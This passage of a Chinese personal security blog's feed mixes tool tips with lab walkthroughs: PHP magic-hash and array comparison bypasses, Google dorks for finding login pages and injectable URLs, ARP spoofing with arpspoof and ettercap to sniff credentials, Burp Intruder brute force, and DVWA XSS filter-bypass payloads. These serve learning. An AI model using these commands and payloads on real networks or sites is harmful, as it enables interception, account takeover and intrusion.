compare漏洞</h3><p>PHP在处理哈希字符串时，如果利用”!=”或”==”来对哈希值进行比较，它把每一个以”0x”开头的哈希值都解释为科学计数法0的多少次方（为0），所以如果两个不同的密码经过哈希以后，其哈希值都是以”0e”开头的，那么php将会认为他们相同。<br>常见的payload有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0x01 md5(str)</span><br><span class="line">    QNKCDZO</span><br><span class="line">    240610708</span><br><span class="line">    s878926199a</span><br><span class="line">    s155964671a</span><br><span class="line">    s214587387a</span><br><span class="line">    s214587387a</span><br><span class="line">0x02 sha1(str)</span><br><span class="line">    sha1(&apos;aaroZmOk&apos;)  </span><br><span class="line">    sha1(&apos;aaK1STfY&apos;)</span><br><span class="line">    sha1(&apos;aaO8zKZF&apos;)</span><br><span class="line">    sha1(&apos;aa3OFF9m&apos;)</span><br></pre></td></tr></table></figure></p><p>同时MD5不能处理数组，若有以下判断则可用数组绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(@md5($_GET[&apos;a&apos;]) == @md5($_GET[&apos;b&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;yes&quot;;</span><br><span class="line">&#125;</span><br><span class="line">//http://127.0.0.1/1.php?a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure></p><p><a href="https://blog.csdn.net/hitwangpeng/article/details/45972099" target="_blank" rel="noopener">变量覆盖</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;正则表达式&quot;&gt;&lt;a href=&quot;#正则表达式&quot; class=&quot;headerlink&quot; title=&quot;正则表达式&quot;&gt;&lt;/a&gt;正则表达式&lt;/h3&gt;&lt;p&gt;preg_match&lt;br&gt;如果在进行正则表达式匹配的时候，没有限制字符串的开始和结束(^ 和 $)，则可以存在绕过
      
    
    </summary>
    
      <category term="Security" scheme="https://github.com/hjyApple/hjyApple.github.io/categories/Security/"/>
    
    
      <category term="PHP" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Google Hack</title>
    <link href="https://github.com/hjyApple/hjyApple.github.io/2018/05/13/GoogleHack/"/>
    <id>https://github.com/hjyApple/hjyApple.github.io/2018/05/13/GoogleHack/</id>
    <published>2018-05-13T07:13:51.000Z</published>
    <updated>2018-08-02T03:17:07.364Z</updated>
    
    <content type="html"><![CDATA[<table><thead><tr><th>关键字</th><th>说明</th></tr></thead><tbody><tr><td>site</td><td>指定域名</td><td></td></tr><tr><td>intitle</td><td>标题中存在关键字的网页</td><td></td></tr><tr><td>intext</td><td>标题中存在关键字的网页</td><td></td></tr><tr><td>info</td><td>一些基本信息</td><td></td></tr><tr><td>inur</td><td>URL存在关键字的网页</td><td></td></tr><tr><td>filetype</td><td>搜索指定文件类型</td><td></td></tr></tbody></table><p>案例一：搜索存在敏感信息的网站<br>输入：<code>intitle:管理登录 filetype:php</code>,这句话的意思为查询网页标题含有“管理登录”，并且为php类型的网站，Google可以轻松搜索到很多该类网站<br>案例二：搜集Discuz论坛主机<br>语法为：<code>intext:Powered by Discuz</code><br>案例三:搜索有注入点的网站<br>语法:<code>inurl:?id=</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;关键字&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;site&lt;/td&gt;
&lt;td&gt;指定域名&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;intitle&lt;/td&gt;

      
    
    </summary>
    
      <category term="Security" scheme="https://github.com/hjyApple/hjyApple.github.io/categories/Security/"/>
    
    
      <category term="Web Security" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/Web-Security/"/>
    
  </entry>
  
  <entry>
    <title>sublime text不能安装插件，错误提示</title>
    <link href="https://github.com/hjyApple/hjyApple.github.io/2018/05/06/sublime/"/>
    <id>https://github.com/hjyApple/hjyApple.github.io/2018/05/06/sublime/</id>
    <published>2018-05-06T04:59:07.000Z</published>
    <updated>2018-07-08T08:52:13.059Z</updated>
    
    <content type="html"><![CDATA[<h3 id="sublime-text不能安装插件，错误提示There-are-no-packages-available-for-installation。"><a href="#sublime-text不能安装插件，错误提示There-are-no-packages-available-for-installation。" class="headerlink" title="sublime text不能安装插件，错误提示There are no packages available for installation。"></a>sublime text不能安装插件，错误提示There are no packages available for installation。</h3><h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><p>1、cmd下输入<code>ping sublime.wbond.net</code><br>记录返回的IP地址<br>2、将上一步得到的IP地址加入到本机hosts文件中，hosts文件所在目录为C:\Windows\System32\drivers\etc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#sublime</span><br><span class="line">第一步的IP地址       sublime.wbond.net.</span><br><span class="line">#end</span><br></pre></td></tr></table></figure></p><p>4、修改后保存，重启sublime</p><h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>一、先安装<code>Package Control.sublime-package</code>到Sublime Text\Packages下面<br><a href="https://pan.baidu.com/s/1N1RKJrMh2nlzLgwm-r2QDQ" target="_blank" rel="noopener">下载链接</a> 密码：<code>viuc</code><br>二、安装REPL<br>1、手动下载sublimeREPL插件<em><a href="https://github.com/wuub/SublimeREPL">https://github.com/wuub/SublimeREPL</a></em>，将其解压到sublime Text\Data\Packages目录下<br>2、打开\sublime Text\Data\Packages\sublimeREPL\config\python\Main.sublime-menu文件，找到”id”为”reply_python”的段落，将”cmd”的属性改为<code>[&quot;python&quot;, &quot;-i&quot;, &quot;-u&quot;, &quot;$file_basename&quot;]</code><br>这样相当于将SublimeREPL的python交互环境的命令改为运行当前文件的交互环境，如果还想保留以前的功能，可以自己添加一个这样的节点，注意id值要取名为唯一的id值。<br>3、设置快捷键<br>点击首选项-&gt;按键绑定-用户，然后在弹出的文件中输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">&#123; &quot;keys&quot;: [&quot;alt+q&quot;], &quot;command&quot;: &quot;repl_open&quot;,   </span><br><span class="line">             &quot;caption&quot;: &quot;Python&quot;,  </span><br><span class="line">             &quot;mnemonic&quot;: &quot;p&quot;,  </span><br><span class="line">             &quot;args&quot;: &#123;  </span><br><span class="line">             &quot;type&quot;: &quot;subprocess&quot;,  </span><br><span class="line">             &quot;encoding&quot;: &quot;utf8&quot;,  </span><br><span class="line">             &quot;cmd&quot;: [&quot;python&quot;, &quot;-i&quot;, &quot;-u&quot;, &quot;$file&quot;],  </span><br><span class="line">             &quot;cwd&quot;: &quot;$file_path&quot;,  </span><br><span class="line">             &quot;syntax&quot;: &quot;Packages/Python/Python.tmLanguage&quot;,  </span><br><span class="line">             &quot;external_id&quot;: &quot;python&quot;  </span><br><span class="line">             &#125;   </span><br><span class="line">&#125;  </span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><p>本文仅定义了Python - RUN current file的快捷键，这里使用的是alt+q，可以根据自己的需要进行灵活的调整。<br>为了调试方便，我们可以把这个窗口放到右边，先设置sublime的窗口显示为多层，点击查看-&gt;布局-&gt;列数 2列<br>方法二参考<em><a href="https://blog.csdn.net/zhihaoma/article/details/51132755" target="_blank" rel="noopener">https://blog.csdn.net/zhihaoma/article/details/51132755</a></em><br><a href="https://blog.csdn.net/feilong_csdn/article/details/67638660" target="_blank" rel="noopener">其他方法参考</a><br></p><p>Sublime默认主题配置</p><p><img src="https://upload-images.jianshu.io/upload_images/9464729-aaf3f055b8094295.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="sublime主题.jpg"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;sublime-text不能安装插件，错误提示There-are-no-packages-available-for-installation。&quot;&gt;&lt;a href=&quot;#sublime-text不能安装插件，错误提示There-are-no-packages-ava
      
    
    </summary>
    
      <category term="Tools" scheme="https://github.com/hjyApple/hjyApple.github.io/categories/Tools/"/>
    
    
      <category term="Tools" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>win10开机键盘无法使用问题</title>
    <link href="https://github.com/hjyApple/hjyApple.github.io/2018/05/05/%E9%94%AE%E7%9B%98%E9%97%AE%E9%A2%98/"/>
    <id>https://github.com/hjyApple/hjyApple.github.io/2018/05/05/键盘问题/</id>
    <published>2018-05-05T03:17:37.000Z</published>
    <updated>2018-05-05T03:23:57.730Z</updated>
    
    <content type="html"><![CDATA[<p>电脑开机外置键盘无法使用<br>进入设备管理器发现键盘下的<code>PC/AT 增强型PS/2键盘</code>驱动为感叹号<br>打开注册表，此时键盘无法使用，那就进入C盘Windows文件下双击regedit.exe文件打开注册表，依次进入<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4D36E96B-E325-11CE-BFC1-08002BE10318}</code><br>删除UpperFilters项<br>在设备管理器下的键盘选项里删除<code>PC/AT 增强型PS/2键盘</code><br>卸载此设备，重新启动。<br>此时安装驱动会提示错误代码10，该设备无法启动。</p><p>接着修改注册表：<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4D36E96B-E325-11CE-BFC1-08002BE10318}</code><br>添加字符串<code>UpperFilters</code>项，内容为<code>kbdclass</code><br>卸载设备，重新启动。<br>重新启动后问题得以解决。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;电脑开机外置键盘无法使用&lt;br&gt;进入设备管理器发现键盘下的&lt;code&gt;PC/AT 增强型PS/2键盘&lt;/code&gt;驱动为感叹号&lt;br&gt;打开注册表，此时键盘无法使用，那就进入C盘Windows文件下双击regedit.exe文件打开注册表，依次进入&lt;code&gt;HKEY_LOC
      
    
    </summary>
    
    
      <category term="Windows" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>Windows使用问题</title>
    <link href="https://github.com/hjyApple/hjyApple.github.io/2018/04/22/office/"/>
    <id>https://github.com/hjyApple/hjyApple.github.io/2018/04/22/office/</id>
    <published>2018-04-22T07:20:40.000Z</published>
    <updated>2018-04-24T00:50:35.272Z</updated>
    
    <content type="html"><![CDATA[<h2 id="office的问题"><a href="#office的问题" class="headerlink" title="office的问题"></a>office的问题</h2><h3 id="Office打开文件问题"><a href="#Office打开文件问题" class="headerlink" title="Office打开文件问题"></a>Office打开文件问题</h3><p><img src="https://upload-images.jianshu.io/upload_images/9464729-c534cdd14f4c6fc4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="问题"><br>解决此问题，先左击该文件，再右击属性，右下角文件属性，解除锁定<br><img src="https://upload-images.jianshu.io/upload_images/9464729-5747ad9c09d37b12.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="属性"></p><p>问题解决</p><h3 id="两行文字之间有空白段"><a href="#两行文字之间有空白段" class="headerlink" title="两行文字之间有空白段"></a>两行文字之间有空白段</h3><p>PDF转为word的文件，两行文字之间有空白段，但是按删除键却删除不了，这是由于文档中插入了分页符，我们需要删除分页符</p><p><img src="https://upload-images.jianshu.io/upload_images/9464729-3968c9f2aaa32056.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><p>删除分页符方法：第三步处，鼠标移至分页符前面按下Delete键即可删除此段空白<br><img src="https://upload-images.jianshu.io/upload_images/9464729-c7a499532db8cf71.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><h2 id="windows管理员权限删除文件依然删除不掉"><a href="#windows管理员权限删除文件依然删除不掉" class="headerlink" title="windows管理员权限删除文件依然删除不掉"></a>windows管理员权限删除文件依然删除不掉</h2><p>电脑在开机状态下按shift键，选择重启，开机进入高级选项模式，进入命令行模式，使用命令删除此类文件<br>rd /s /q 文件夹<br>del /F /S /Q 文件夹</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;office的问题&quot;&gt;&lt;a href=&quot;#office的问题&quot; class=&quot;headerlink&quot; title=&quot;office的问题&quot;&gt;&lt;/a&gt;office的问题&lt;/h2&gt;&lt;h3 id=&quot;Office打开文件问题&quot;&gt;&lt;a href=&quot;#Office打开文件问题&quot;
      
    
    </summary>
    
      <category term="Windows" scheme="https://github.com/hjyApple/hjyApple.github.io/categories/Windows/"/>
    
    
      <category term="Windows" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>arp欺骗</title>
    <link href="https://github.com/hjyApple/hjyApple.github.io/2018/04/22/arp/"/>
    <id>https://github.com/hjyApple/hjyApple.github.io/2018/04/22/arp/</id>
    <published>2018-04-22T01:44:33.000Z</published>
    <updated>2018-07-21T02:50:46.073Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h3><p>ARP（Address Resolution Protocol）是地址解析协议，<br>是一种将IP地址转化成物理地址的协议。从IP地址到物理地址的映射有两种方式：表格方式和非表格方式。ARP具体说来就是将网络层（也就是相当于OSI的第三层）地址解析为数据链路层（也就是相当于OSI的第二层）的物理地址(注:此处物理地址并不一定指MAC地址)。</p><h3 id="ARP原理"><a href="#ARP原理" class="headerlink" title="ARP原理"></a>ARP原理</h3><p>某机器A要向主机B发送报文，会查询本地的ARP缓存表，找到B的IP地址对应的MAC地址后，就会进行数据传输。如果未找到，则A广播一个ARP请求报文（携带主机A的IP地址Ia——物理地址Pa），请求IP地址为Ib的主机B回答物理地址Pb。网上所有主机包括B都收到ARP请求，但只有主机B识别自己的IP地址，于是向A主机发回一个ARP响应报文。其中就包含有B的MAC地址，A接收到B的应答后，就会更新本地的ARP缓存。接着使用这个MAC地址发送数据（由网卡附加MAC地址）。因此，本地高速缓存的这个ARP表是本地网络流通的基础，而且这个缓存是动态的。</p><h3 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h3><p>在局域网中，黑客经过收到ARP Request广播包，能够偷听到其它节点的 (IP, MAC) 地址, 黑客就伪装为A，告诉B (受害者) 一个假地址，使得B在发送给A 的数据包都被黑客截取；ARP欺骗是局域网中常用的攻击手段，其目的是对局域网中的目标机数据包进行转发，以实现中间人攻击，进而对数据监听、重放、钓鱼等攻击。</p><h4 id="ARP实战"><a href="#ARP实战" class="headerlink" title="ARP实战"></a>ARP实战</h4><p>在kali虚拟机下进行练习<br>本机IP<br><img src="https://upload-images.jianshu.io/upload_images/9464729-c8c0b06780eddf6a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>查看局域网中哪些主机在线<br><code>fping -asg 192.168.231.0/24</code>（局域网的网段）<br><img src="https://upload-images.jianshu.io/upload_images/9464729-dc3c7d2a04ab437a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="fping"><br>使用arpspoof工具进行欺骗，<code>arpspoof -h</code>，<br><img src="https://upload-images.jianshu.io/upload_images/9464729-f0a1aac7ad33ccb7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="arp"><br>输入<code>arpspoof -i eth0 -t 192.168.0.102 -r 192.168.0.1</code><br>arpspoof -i 攻击机网卡 -t 目标主机IP 目标主机网关。<br>此时目标机已经断网。<br>ctrl+c停止断网攻击。</p><h6 id="ARP欺骗-1"><a href="#ARP欺骗-1" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h6><p>linux默认不支持ip转发，修改配置文件以开启流量转发<br><code>echo 1 &gt;/proc/sys/net/ipv4/ip_dorward</code><br>依然使用ARPSpoof工具，输入<code>arpspoof -i eth0 -t 192.168.0.102 -r 192.168.0.1</code>开始欺骗，<br>接下来使用ettercap嗅探工具来抓取http协议上的登录账户和密码<code>ettercap -Tq -i eth0</code></p><p>进行图片获取使用<code>Driftnet -i eth0</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;ARP&quot;&gt;&lt;a href=&quot;#ARP&quot; class=&quot;headerlink&quot; title=&quot;ARP&quot;&gt;&lt;/a&gt;ARP&lt;/h3&gt;&lt;p&gt;ARP（Address Resolution Protocol）是地址解析协议，&lt;br&gt;是一种将IP地址转化成物理地址的协议。从IP
      
    
    </summary>
    
      <category term="Security" scheme="https://github.com/hjyApple/hjyApple.github.io/categories/Security/"/>
    
    
      <category term="Wireless security" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/Wireless-security/"/>
    
  </entry>
  
  <entry>
    <title>Brute_Force</title>
    <link href="https://github.com/hjyApple/hjyApple.github.io/2018/04/21/Brute-Force/"/>
    <id>https://github.com/hjyApple/hjyApple.github.io/2018/04/21/Brute-Force/</id>
    <published>2018-04-21T02:33:29.000Z</published>
    <updated>2018-05-13T07:19:42.673Z</updated>
    
    <content type="html"><![CDATA[<p>首先来认识下Burp Suite Intruder的四种攻击类型：</p><h4 id="Sniper（狙击手模式）"><a href="#Sniper（狙击手模式）" class="headerlink" title="Sniper（狙击手模式）"></a>Sniper（狙击手模式）</h4><p>这个模式使用单一的payload组。它会针对每个位置设置payload。这种攻击类型适合对常见漏洞中的请求参数单独地进行fuzzing测试。攻击中的请求总数应该是position数量和payload数量的乘积。</p><h4 id="Battering-ram（攻城锤模式）"><a href="#Battering-ram（攻城锤模式）" class="headerlink" title="Battering ram（攻城锤模式）"></a>Battering ram（攻城锤模式）</h4><p>这一模式使用单一的payload组。它会重复payload并且一次把所有相同的payload放入指定的位置中。这种攻击适合那种需要在请求中把相同的输入放到多个位置的情况。请求的总数是payload组中payload的总数。</p><h4 id="Pitchfork（草叉模式）"><a href="#Pitchfork（草叉模式）" class="headerlink" title="Pitchfork（草叉模式）"></a>Pitchfork（草叉模式）</h4><p>这一模式使用多个payload组。对于定义的位置可以使用不同的payload组。攻击会同步迭代所有的payload组，把payload放入每个定义的位置中。这种攻击类型非常适合那种不同位置中需要插入不同但相关的输入的情况。请求的数量应该是最小的payload组中的payload数量。</p><h4 id="Cluster-bomb（集束炸弹模式）"><a href="#Cluster-bomb（集束炸弹模式）" class="headerlink" title="Cluster bomb（集束炸弹模式）"></a>Cluster bomb（集束炸弹模式）</h4><p>这种模式会使用多个payload组。每个定义的位置中有不同的payload组。攻击会迭代每个payload组，每种payload组合都会被测试一遍。这种攻击适用于那种位置中需要不同且不相关或者未知的输入的攻击。攻击请求的总数是各payload组中payload数量的乘积。</p><h5 id="DVWA下的Brute-Force模块"><a href="#DVWA下的Brute-Force模块" class="headerlink" title="DVWA下的Brute Force模块"></a>DVWA下的Brute Force模块</h5><p>随便登录一个账号，记下报错码<br><img src="https://upload-images.jianshu.io/upload_images/9464729-deafa0671bebb1f5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="错误码"><br>打开BurpSuite，抓包开始爆破<br><img src="https://upload-images.jianshu.io/upload_images/9464729-f8e855bcd42c1f3c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>Ctrl+I发送到Intruder模块，选择攻击类型，此处为了爆破账户名和密码，选择Cluster bomb模式，选中要进行爆破的字段内容<br><img src="https://upload-images.jianshu.io/upload_images/9464729-07eff3d34e907e49.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="首先改"><br>在Payloads选项卡下面，设置set：1的list，可以自定义，也可以使用BurpSuite自带的字段，set：2设置密码字段，可以在simple list里面用load使用本地密码字典<br><img src="https://upload-images.jianshu.io/upload_images/9464729-b899a05db27105cc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1+2"><br>复制刚刚的报错信息到Options选项卡里面，在Grep-Match里面Add一下<br><img src="https://upload-images.jianshu.io/upload_images/9464729-0e64530aac748cc8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="错误"><br>准备工作到此结束，可以开始攻击了，点击Start attack,根据Length的不同，找出有效的Payload，<br><img src="https://upload-images.jianshu.io/upload_images/9464729-50a0f7c0f6eb0c67.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="破解"><br>在response里面查看一下，成功了，大功告成<br><img src="https://upload-images.jianshu.io/upload_images/9464729-682d4cfe8c40d9f6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="显示"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;首先来认识下Burp Suite Intruder的四种攻击类型：&lt;/p&gt;
&lt;h4 id=&quot;Sniper（狙击手模式）&quot;&gt;&lt;a href=&quot;#Sniper（狙击手模式）&quot; class=&quot;headerlink&quot; title=&quot;Sniper（狙击手模式）&quot;&gt;&lt;/a&gt;Sniper
      
    
    </summary>
    
      <category term="Tools" scheme="https://github.com/hjyApple/hjyApple.github.io/categories/Tools/"/>
    
    
      <category term="Tools" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/Tools/"/>
    
      <category term="BurpSuite" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/BurpSuite/"/>
    
  </entry>
  
  <entry>
    <title>DVWA系列之XSS</title>
    <link href="https://github.com/hjyApple/hjyApple.github.io/2018/04/19/xss/"/>
    <id>https://github.com/hjyApple/hjyApple.github.io/2018/04/19/xss/</id>
    <published>2018-04-19T05:45:55.000Z</published>
    <updated>2018-05-13T07:22:05.957Z</updated>
    
    <content type="html"><![CDATA[<p>前期准备：linux下搭建dvwa需要lamp环境，其php版本不能太高，php7.0无法使用，php5.6可以;</p><h4 id="XSS定义"><a href="#XSS定义" class="headerlink" title="XSS定义"></a>XSS定义</h4><p>CSS(Cross Site Script)又叫XSS,中文意思：<a href="http://baike.baidu.com/view/2633667.htm" target="_blank" rel="noopener">跨站脚本攻击</a>。它指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行。XSS的攻击目标是为了盗取客户端的cookie或者其他网站用于识别客户端身份的敏感信息。获取到合法用户的信息后，攻击者甚至可以假冒最终用户与网站进行交互。</p><h4 id="XSS的原理"><a href="#XSS的原理" class="headerlink" title="XSS的原理"></a>XSS的原理</h4><p>也就是往HTML中注入脚本，HTML指定了脚本标记<script></script>.在没有过滤字符的情况下，只需要保持完整无错的脚本标记即可触发XSS，假如我们在某个资料表单提交内容,表单提交内容就是某个标记属性所赋的值，我们可以构造如下值来闭和标记来构造完整无错的脚本标记，<code>&quot;&gt;&lt;script&gt;alert(&#39;Xss&#39;);&lt;/script&gt;&lt;&quot;</code></p><h4 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h4><h5 id="等级Low"><a href="#等级Low" class="headerlink" title="等级Low"></a>等级Low</h5><p>源代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Hello '</span> . $_GET[ <span class="string">'name'</span> ] . <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>这里随便输入Word试一下：<br><code>word&lt;script&gt;alert(&#39;Xss&#39;);&lt;/script&gt; ;</code><img src="https://upload-images.jianshu.io/upload_images/9464729-448fa2c12d5bea08.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="基本的xss"><br>观察到调用函数输出了Xss弹窗,后面为Word,其实<script>”注入语句“</script>可以完成许多功能。</p><h5 id="等级Medium"><a href="#等级Medium" class="headerlink" title="等级Medium"></a>等级Medium</h5><p>源代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>观察发现使用<code>str_replace</code>进行了黑名单过滤，绕过这个不成问题，使用 </p><h6 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h6><p><code>&lt;scri&lt;script&gt;pt&gt;alert(/test/);&lt;/script&gt;</code></p><h6 id="大小写混写绕过"><a href="#大小写混写绕过" class="headerlink" title="大小写混写绕过"></a>大小写混写绕过</h6><p><code>&lt;sCripT&gt;alert(/test/);&lt;/script&gt;</code><br><img src="https://upload-images.jianshu.io/upload_images/9464729-f3d2f4ad6391c2a5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="xss"></p><h5 id="等级High"><a href="#等级High" class="headerlink" title="等级High"></a>等级High</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用正则进行匹配，过滤了大小写混合写入已经双写，但是可以使用img、body等标签的事件以及iframe标签的src注入恶意的js代码进行漏洞利用<br><code>&lt;img src=1 onerror=alert(&#39;test&#39;)&gt;</code><br><img src="https://upload-images.jianshu.io/upload_images/9464729-6c8fc0dd38766d98.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="xss"></p><h5 id="等级Impossible"><a href="#等级Impossible" class="headerlink" title="等级Impossible"></a>等级Impossible</h5><p>源代码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span 